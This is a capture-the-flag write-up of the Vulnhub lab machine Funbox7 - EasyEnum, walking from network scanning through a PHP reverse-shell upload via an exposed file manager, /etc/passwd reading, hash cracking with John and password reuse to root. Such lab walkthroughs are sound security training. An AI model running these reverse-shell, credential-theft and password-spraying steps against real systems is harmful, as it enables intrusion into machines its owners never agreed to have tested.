---
title: Write-up Funbox7 - EasyEnum on Vulnhub
author: eMVee
date: 2024-03-31 00:00:00 +0800
categories: [CTF, Vulnhub]
tags: [Vulnhub, shell, password reuse, OSWA]
render_with_liquid: false
---

A while back I came across a blog about preparing for the OSWA exam. This blog mentioned a number of vulnerable machines, including Funbox7 - EasyEnum. A vulnerable machine shared on [Vulnhub](https://www.vulnhub.com/entry/funbox-easyenum,565/). Although I have no idea yet what is covered in OSWA, I have decided to prepare for OSWA. The name Easyenum sounds like it won't be a difficult machine. Let's rock this machine!

## Getting started
As usual we should start with creating a project directory for this machine.

```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub]
└─$ mkdir Funbox7 

┌──(emvee㉿kali)-[~/Documents/Vulnhub]
└─$ cd Funbox7 
```
Next we should know what IP address is assigned to our attacking machine.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/Funbox7]
└─$ ip a            
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host noprefixroute 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:0e:ca:e6 brd ff:ff:ff:ff:ff:ff
    inet 10.0.2.15/24 brd 10.0.2.255 scope global dynamic noprefixroute eth0
       valid_lft 379sec preferred_lft 379sec
    inet6 fe80::a00:27ff:fe0e:cae6/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
3: br-39d03f437719: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
    link/ether 02:42:1e:08:44:3c brd ff:ff:ff:ff:ff:ff
    inet 172.18.0.1/16 brd 172.18.255.255 scope global br-39d03f437719
       valid_lft forever preferred_lft forever
4: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
    link/ether 02:42:0d:2e:b4:57 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever

```
We have created a project directory and know our own IP address. So we are ready to rumble!

## Enumeration
Now we should identify the IP address of our target in our virtual network. One of the possibilities to identify a host on your network can be done with `arp-scan`.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/Funbox7]
└─$ sudo arp-scan --localnet       
[sudo] password for emvee: 
Interface: eth0, type: EN10MB, MAC: 08:00:27:0e:ca:e6, IPv4: 10.0.2.15
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
10.0.2.1        52:54:00:12:35:00       QEMU
10.0.2.3        08:00:27:a1:e2:45       PCS Systemtechnik GmbH
10.0.2.2        52:54:00:12:35:00       QEMU
10.0.2.63       08:00:27:dc:2f:bf       PCS Systemtechnik GmbH

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.562 seconds (99.92 hosts/sec). 4 responded

```
In no time we have an IP address identified that is assigned to our target. We should assign it to a variable in our terminal.
This will make our life easier by executing our commands. After assigning the IP address to a variable we can utilize the ping command to try to identify the Operating System of the target.

```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/Funbox7]
└─$ ip=10.0.2.63    

┌──(emvee㉿kali)-[~/Documents/Vulnhub/Funbox7]
└─$ ping $ip -c 3    
PING 10.0.2.63 (10.0.2.63) 56(84) bytes of data.
64 bytes from 10.0.2.63: icmp_seq=1 ttl=64 time=0.828 ms
64 bytes from 10.0.2.63: icmp_seq=2 ttl=64 time=0.383 ms
64 bytes from 10.0.2.63: icmp_seq=3 ttl=64 time=0.376 ms

--- 10.0.2.63 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2042ms
rtt min/avg/max/mdev = 0.376/0.529/0.828/0.211 ms

```
Based on the value in the `ttl` field we can almost assume that the target is running on a Linux Operating System.
Our next step should be identifying open ports and running services on the target. We can use nmap to identify those.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/Funbox7]
└─$ sudo nmap -sC -sV -T4 -A -O -p- $ip
Starting Nmap 7.94 ( https://nmap.org ) at 2024-03-31 16:55 CEST
Nmap scan report for 10.0.2.63
Host is up (0.00045s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 9c:52:32:5b:8b:f6:38:c7:7f:a1:b7:04:85:49:54:f3 (RSA)
|   256 d6:13:56:06:15:36:24:ad:65:5e:7a:a1:8c:e5:64:f4 (ECDSA)
|_  256 1b:a9:f3:5a:d0:51:83:18:3a:23:dd:c4:a9:be:59:f0 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: 08:00:27:DC:2F:BF (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5
OS details: Linux 5.0 - 5.5
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.46 ms 10.0.2.63

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.90 seconds

```
As soon as nmap finished the scan we should analyze the results and make some notes on it.
- Linux, probably Ubuntu
- Port 22
	- SSH
	- OpenSSH 7.6p1
- Port 80
	- HTTP
	- Apache 2.4.29
	- Apache2 Ubuntu Default Page: It works

Since there is a default page shown on port 80 we should try to identify other directories and files on the webserver.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/Funbox7]
└─$ dirsearch -u http://$ip -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e html,php,txt

  _|. _ _  _  _  _ _|_    v0.4.2                                                    
 (_||| _) (/_(_|| (_| ) 
 
Extensions: html, php, txt | HTTP method: GET | Threads: 30 | Wordlist size: 220545

Output File: /home/emvee/.dirsearch/reports/10.0.2.63/_24-03-31_16-56-31.txt

Error Log: /home/emvee/.dirsearch/logs/errors-24-03-31_16-56-31.log

Target: http://10.0.2.63/

[16:56:31] Starting: 
[16:56:33] 301 -  311B  - /javascript  ->  http://10.0.2.63/javascript/    
[16:56:42] 301 -  307B  - /secret  ->  http://10.0.2.63/secret/            
[16:56:54] 301 -  311B  - /phpmyadmin  ->  http://10.0.2.63/phpmyadmin/ 
```
Dirsearch did only identify directories what should trigger us to use another tool to enumerate files as well.
In the results we have identified a few folder what might be interesting for us:
- scret
- phpmyadmin

Let's check the secret directory with curl.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/Funbox7]
└─$ curl http://10.0.2.63/secret/ 
根密码是用户密码的组合：harrysallygoatoraclelissy

```
It looks like some names and in front of it a bit of Chinese. Since I am not familiar with Chinese language I decided to use Google Translate.
![Image](/assets/img/WriteUp/Vulnhub/Funbox7/Pasted image 20240331203928.png){: width="700" height="400" }

It looks like a hint to pwn the system.

As mentioned earlier, we were not able to discover files with dirsearch we should try another tool to search for files.
One of the tools to perform this action is gobuster. Let's search for `php` and `txt` files.

```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/Funbox7]
└─$ gobuster dir -u $ip -w /usr/share/wordlists/dirb/common.txt -t 5 -x php,txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.0.2.63
[+] Method:                  GET
[+] Threads:                 5
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 274]
/.hta                 (Status: 403) [Size: 274]
/.hta.php             (Status: 403) [Size: 274]
/.htaccess            (Status: 403) [Size: 274]
/.hta.txt             (Status: 403) [Size: 274]
/.htaccess.txt        (Status: 403) [Size: 274]
/.htpasswd            (Status: 403) [Size: 274]
/.htaccess.php        (Status: 403) [Size: 274]
/.htpasswd.txt        (Status: 403) [Size: 274]
/.htpasswd.php        (Status: 403) [Size: 274]
/index.html           (Status: 200) [Size: 10918]
/javascript           (Status: 301) [Size: 311] [--> http://10.0.2.63/javascript/]
/mini.php             (Status: 200) [Size: 4443]
/phpmyadmin           (Status: 301) [Size: 311] [--> http://10.0.2.63/phpmyadmin/]
/robots.txt           (Status: 200) [Size: 21]
/robots.txt           (Status: 200) [Size: 21]
/secret               (Status: 301) [Size: 307] [--> http://10.0.2.63/secret/]
/server-status        (Status: 403) [Size: 274]
Progress: 13842 / 13845 (99.98%)
===============================================================
Finished
===============================================================
                                                                  
```
There are two files found what might be interesting:
- robots.txt
- mini.php 

Let's visit the mini.php file in the browser.

![Image](/assets/img/WriteUp/Vulnhub/Funbox7/Pasted image 20240331200745.png){: width="700" height="400" }

It looks like we can upload files and give permissions to files. Let's upload our reverse shell and before uploading edit it so it has my IP address of the attacker machine.

```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/Funbox7]
└─$ cp /usr/share/webshells/php/php-reverse-shell.php .

┌──(emvee㉿kali)-[~/Documents/Vulnhub/Funbox7]
└─$ nano php-reverse-shell.php 
```
Next we should start a netcat listener.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/Funbox7]
└─$ nc -lvp 1234              
listening on [any] 1234 ...

```

Everything is set, let's upload the file.

![Image](/assets/img/WriteUp/Vulnhub/Funbox7/Pasted image 20240331201017.png){: width="700" height="400" }


By refreshing the page we can see that our reverse shell has been uploaded.

![Image](/assets/img/WriteUp/Vulnhub/Funbox7/Pasted image 20240331201049.png){: width="700" height="400" }


To activate the reverse shell we should visit the web shell.

![Image](/assets/img/WriteUp/Vulnhub/Funbox7/Pasted image 20240331201322.png){: width="700" height="400" }

When we visit the page in the web browser, it indicates it is still loading. This is our sign to look at our netcat listener.


## Initial access

```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/Funbox7]
└─$ nc -lvp 1234              
listening on [any] 1234 ...
10.0.2.63: inverse host lookup failed: Unknown host
connect to [10.0.2.15] from (UNKNOWN) [10.0.2.63] 35202
Linux funbox7 4.15.0-117-generic #118-Ubuntu SMP Fri Sep 4 20:02:41 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 18:12:23 up 46 min,  0 users,  load average: 0.00, 0.12, 1.44
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 

```
It looks like we got a connection as `www-data` from our victim.
One of the next steps is to enumerate the users on the system. Let's check the `/etc/passwd` file for the users.
```bash
$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
karla:x:1000:1000:karla:/home/karla:/bin/bash
mysql:x:111:113:MySQL Server,,,:/nonexistent:/bin/false
harry:x:1001:1001:,,,:/home/harry:/bin/bash
sally:x:1002:1002:,,,:/home/sally:/bin/bash
goat:x:1003:1003:,,,:/home/goat:/bin/bash
oracle:$1$|O@GOeN\$PGb9VNu29e9s6dMNJKH/R0:1004:1004:,,,:/home/oracle:/bin/bash
lissy:x:1005:1005::/home/lissy:/bin/sh

```

We got the same users as found in the secret directory on the webserver.
- harry
- sally
- goat
- oracle
- lissy

The user `oracle` does have a hash `$1$|O@GOeN\$PGb9VNu29e9s6dMNJKH/R0`, what we can try to crack with John The Ripper.

```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/Funbox7]
└─$ nano hash

┌──(emvee㉿kali)-[~/Documents/Vulnhub/Funbox7]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash    
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
hiphop           (?)     
1g 0:00:00:00 DONE (2024-03-31 20:14) 8.333g/s 3200p/s 3200c/s 3200C/s 123456..michael1
Use the "--show" option to display all of the cracked passwords reliably
Session completed.

```
We got a passwordfor the user oracle. We should se if we can switch user to oracle and look if we have more persmissions.

```bash
$ su oracle
su: must be run from a terminal

```
That did not work yet.

## Privilege escalation
Let's upgrade the shell a bit so we can switch user in our terminal.
```bash
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@funbox7:/$ su oracle
su oracle
Password: hiphop

oracle@funbox7:/$ 

```
We are oracle on the system, we should check if we can run anything as sudoer. To check this we can run `sudo -l` in the terminal.

```bash
oracle@funbox7:~$ sudo -l           sudo -l
sudo -l
[sudo] password for oracle: hiphop

Sorry, user oracle may not run sudo on funbox7.
```
We got no luck on this one yet. We should check the home directories of the other users to see if we can find anything useful.
```bash
oracle@funbox7:~$ ls /home -ahlR    ls /home -ahlR
ls /home -ahlR
/home:
total 28K
drwxr-xr-x  7 root   root   4.0K Sep 18  2020 .
drwxr-xr-x 24 root   root   4.0K Mar 31 15:16 ..
drwxr-xr-x  4 goat   goat   4.0K Sep 19  2020 goat
drwxr-xr-x  2 harry  harry  4.0K Sep 19  2020 harry
drwxr-xr-x  4 karla  karla  4.0K Sep 18  2020 karla
drwxr-xr-x  3 oracle oracle 4.0K Mar 31 18:18 oracle
drwxr-xr-x  2 sally  sally  4.0K Sep 19  2020 sally

/home/goat:
total 40K
drwxr-xr-x 4 goat goat 4.0K Sep 19  2020 .
drwxr-xr-x 7 root root 4.0K Sep 18  2020 ..
-rw------- 1 goat goat  292 Sep 19  2020 .bash_history
-rw-r--r-- 1 goat goat  220 Sep 18  2020 .bash_logout
-rw-r--r-- 1 goat goat 3.7K Sep 18  2020 .bashrc
drwx------ 2 goat goat 4.0K Sep 19  2020 .cache
drwx------ 3 goat goat 4.0K Sep 19  2020 .gnupg
-rw------- 1 root root    0 Sep 19  2020 .mysql_history
-rw-r--r-- 1 goat goat  807 Sep 18  2020 .profile
-rw-r----- 1 root root 1.4K Sep 18  2020 shadow.bak
-rw-rw-r-- 1 goat goat  165 Sep 19  2020 .wget-hsts
ls: cannot open directory '/home/goat/.cache': Permission denied
ls: cannot open directory '/home/goat/.gnupg': Permission denied

/home/harry:
total 20K
drwxr-xr-x 2 harry harry 4.0K Sep 19  2020 .
drwxr-xr-x 7 root  root  4.0K Sep 18  2020 ..
-rw------- 1 harry harry    0 Sep 19  2020 .bash_history
-rw-r--r-- 1 harry harry  220 Sep 18  2020 .bash_logout
-rw-r--r-- 1 harry harry 3.7K Sep 18  2020 .bashrc
-rw-r--r-- 1 harry harry  807 Sep 18  2020 .profile

/home/karla:
total 32K
drwxr-xr-x 4 karla karla 4.0K Sep 18  2020 .
drwxr-xr-x 7 root  root  4.0K Sep 18  2020 ..
-rw------- 1 karla karla    0 Sep 19  2020 .bash_history
-rw-r--r-- 1 karla karla  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 karla karla 3.7K Apr  4  2018 .bashrc
drwx------ 2 karla karla 4.0K Sep 18  2020 .cache
drwx------ 3 karla karla 4.0K Sep 18  2020 .gnupg
-rw-r--r-- 1 karla karla  807 Apr  4  2018 .profile
-r--rw-rw- 1 root  root    41 Sep 18  2020 read.me
-rw-r--r-- 1 karla karla    0 Sep 18  2020 .sudo_as_admin_successful
ls: cannot open directory '/home/karla/.cache': Permission denied
ls: cannot open directory '/home/karla/.gnupg': Permission denied

/home/oracle:
total 24K
drwxr-xr-x 3 oracle oracle 4.0K Mar 31 18:18 .
drwxr-xr-x 7 root   root   4.0K Sep 18  2020 ..
-rw-r--r-- 1 oracle oracle  220 Sep 18  2020 .bash_logout
-rw-r--r-- 1 oracle oracle 3.7K Sep 18  2020 .bashrc
drwx------ 3 oracle oracle 4.0K Mar 31 18:18 .gnupg
-rw-r--r-- 1 oracle oracle  807 Sep 18  2020 .profile

/home/oracle/.gnupg:
total 12K
drwx------ 3 oracle oracle 4.0K Mar 31 18:18 .
drwxr-xr-x 3 oracle oracle 4.0K Mar 31 18:18 ..
drwx------ 2 oracle oracle 4.0K Mar 31 18:18 private-keys-v1.d

/home/oracle/.gnupg/private-keys-v1.d:
total 8.0K
drwx------ 2 oracle oracle 4.0K Mar 31 18:18 .
drwx------ 3 oracle oracle 4.0K Mar 31 18:18 ..

/home/sally:
total 20K
drwxr-xr-x 2 sally sally 4.0K Sep 19  2020 .
drwxr-xr-x 7 root  root  4.0K Sep 18  2020 ..
-rw------- 1 sally sally    0 Sep 19  2020 .bash_history
-rw-r--r-- 1 sally sally  220 Sep 18  2020 .bash_logout
-rw-r--r-- 1 sally sally 3.7K Sep 18  2020 .bashrc
-rw-r--r-- 1 sally sally  807 Sep 18  2020 .profile
```
There is a `read.me` file in the home directory of karla. This file can be read by any user, so we should check the content of the file.
```bash
oracle@funbox7:~$ cat /home/karla/recat /home/karla/read.me
cat /home/karla/read.me
karla is really not a part of this CTF !
oracle@funbox7:~$ 

```
Well, is tis user really not part of the CTF?
There was a `phpmyadmin` directory found on the web server. We should try to see if we can find credentials in the configuration file.

```bash
oracle@funbox7:/$ ls -la /etc/phpmyals -la /etc/phpmyadmin/
ls -la /etc/phpmyadmin/
total 52
drwxr-xr-x   3 root root     4096 Mar 31 15:10 .
drwxr-xr-x 100 root root     4096 Mar 31 15:16 ..
-rw-r--r--   1 root root     2110 Jul 10  2017 apache.conf
drwxr-xr-x   2 root root     4096 Jul 10  2017 conf.d
-rw-r-----   1 root www-data  525 Sep 18  2020 config-db.php
-rw-r--r--   1 root root      168 Jun 23  2016 config.footer.inc.php
-rw-r--r--   1 root root      168 Jun 23  2016 config.header.inc.php
-rw-r--r--   1 root root     6319 Jun 23  2016 config.inc.php
-rw-r-----   1 root www-data    8 Sep 18  2020 htpasswd.setup
-rw-r--r--   1 root root      646 Apr  7  2017 lighttpd.conf
-rw-r--r--   1 root root      198 Jun 23  2016 phpmyadmin.desktop
-rw-r--r--   1 root root      295 Jun 23  2016 phpmyadmin.service
```
We are not allowed to read the `config-db.php` as oracle. But we can read it as `www-data` user. So we should switch back to the `www-data` user.
```bash
oracle@funbox7:/$ exit              exit
exit
exit
www-data@funbox7:/$ cat /etc/phpmyadmin/config-db.php
cat /etc/phpmyadmin/config-db.php
<?php
##
## database access settings in php format
## automatically generated from /etc/dbconfig-common/phpmyadmin.conf
## by /usr/sbin/dbconfig-generate-include
##
## by default this file is managed via ucf, so you shouldn't have to
## worry about manual changes being silently discarded.  *however*,
## you'll probably also want to edit the configuration file mentioned
## above too.
##
$dbuser='phpmyadmin';
$dbpass='tgbzhnujm!';
$basepath='';
$dbname='phpmyadmin';
$dbserver='localhost';
$dbport='3306';
$dbtype='mysql';
www-data@funbox7:/$ 

```
In the configuration file we have found a password. We should add it to our notes, but as well try to spray the password against the users on the system.
```bash
www-data@funbox7:/$ su karla
su karla
Password: tgbzhnujm!

karla@funbox7:/$ 
```
We are lucky, we have a valid password for the user karla. Let's find out if Karla can run any command as sudo user by executing the command `sudo -l`.
```bash
karla@funbox7:/$ sudo -l          sudo -l
sudo -l
[sudo] password for karla: tgbzhnujm!

Matching Defaults entries for karla on funbox7:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User karla may run the following commands on funbox7:
    (ALL : ALL) ALL
karla@funbox7:/$ 
```
Since the user karla can run any sudo command without a password we can switch to the root user with the command `sudo su`. Let's crack this machine by executing this command and become root.
```bash
karla@funbox7:/$ sudo su          sudo su
sudo su
root@funbox7:/# cat /root/root.tcat /root/root.txt
cat /root/root.txt
cat: /root/root.txt: No such file or directory
root@funbox7:/# whoami          whoami
whoami
root
root@funbox7:/# id              id
id
uid=0(root) gid=0(root) groups=0(root)
root@funbox7:/# hostname        hostname
hostname
funbox7
root@funbox7:/# ip a            ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:dc:2f:bf brd ff:ff:ff:ff:ff:ff
    inet 10.0.2.63/24 brd 10.0.2.255 scope global dynamic enp0s3
       valid_lft 328sec preferred_lft 328sec
    inet6 fe80::a00:27ff:fedc:2fbf/64 scope link 
       valid_lft forever preferred_lft forever
root@funbox7:/# 

```
One more step left, just capture the root flag.
```bash
root@funbox7:/# cd /root        cd /root
cd /root
root@funbox7:~# ls              ls
ls
html.tar.gz  root.flag  script.sh
root@funbox7:~# cat root.flag   cat root.flag
cat root.flag
  █████▒ █    ██  ███▄    █  ▄▄▄▄    ▒█████  ▒██   ██▒                   
▓██   ▒  ██  ▓██▒ ██ ▀█   █ ▓█████▄ ▒██▒  ██▒▒▒ █ █ ▒░                   
▒████ ░ ▓██  ▒██░▓██  ▀█ ██▒▒██▒ ▄██▒██░  ██▒░░  █   ░                   
░▓█▒  ░ ▓▓█  ░██░▓██▒  ▐▌██▒▒██░█▀  ▒██   ██░ ░ █ █ ▒                    
░▒█░    ▒▒█████▓ ▒██░   ▓██░░▓█  ▀█▓░ ████▓▒░▒██▒ ▒██▒                   
 ▒ ░    ░▒▓▒ ▒ ▒ ░ ▒░   ▒ ▒ ░▒▓███▀▒░ ▒░▒░▒░ ▒▒ ░ ░▓ ░                   
 ░      ░░▒░ ░ ░ ░ ░░   ░ ▒░▒░▒   ░   ░ ▒ ▒░ ░░   ░▒ ░                   
 ░ ░     ░░░ ░ ░    ░   ░ ░  ░    ░ ░ ░ ░ ▒   ░    ░                     
           ░              ░  ░          ░ ░   ░    ░                     
                                  ░                                      
▓█████  ▄▄▄        ██████ ▓██   ██▓▓█████  ███▄    █  █    ██  ███▄ ▄███▓
▓█   ▀ ▒████▄    ▒██    ▒  ▒██  ██▒▓█   ▀  ██ ▀█   █  ██  ▓██▒▓██▒▀█▀ ██▒
▒███   ▒██  ▀█▄  ░ ▓██▄     ▒██ ██░▒███   ▓██  ▀█ ██▒▓██  ▒██░▓██    ▓██░
▒▓█  ▄ ░██▄▄▄▄██   ▒   ██▒  ░ ▐██▓░▒▓█  ▄ ▓██▒  ▐▌██▒▓▓█  ░██░▒██    ▒██ 
░▒████▒ ▓█   ▓██▒▒██████▒▒  ░ ██▒▓░░▒████▒▒██░   ▓██░▒▒█████▓ ▒██▒   ░██▒
░░ ▒░ ░ ▒▒   ▓▒█░▒ ▒▓▒ ▒ ░   ██▒▒▒ ░░ ▒░ ░░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ ░ ▒░   ░  ░
 ░ ░  ░  ▒   ▒▒ ░░ ░▒  ░ ░ ▓██ ░▒░  ░ ░  ░░ ░░   ░ ▒░░░▒░ ░ ░ ░  ░      ░
   ░     ░   ▒   ░  ░  ░   ▒ ▒ ░░     ░      ░   ░ ░  ░░░ ░ ░ ░      ░   
   ░  ░      ░  ░      ░   ░ ░        ░  ░         ░    ░            ░   
                           ░ ░                                           
                                                                         
...solved ! 

Please, tweet this screenshot to @0815R2d2. Many thanks in advance.

```

We have pwned the machine! 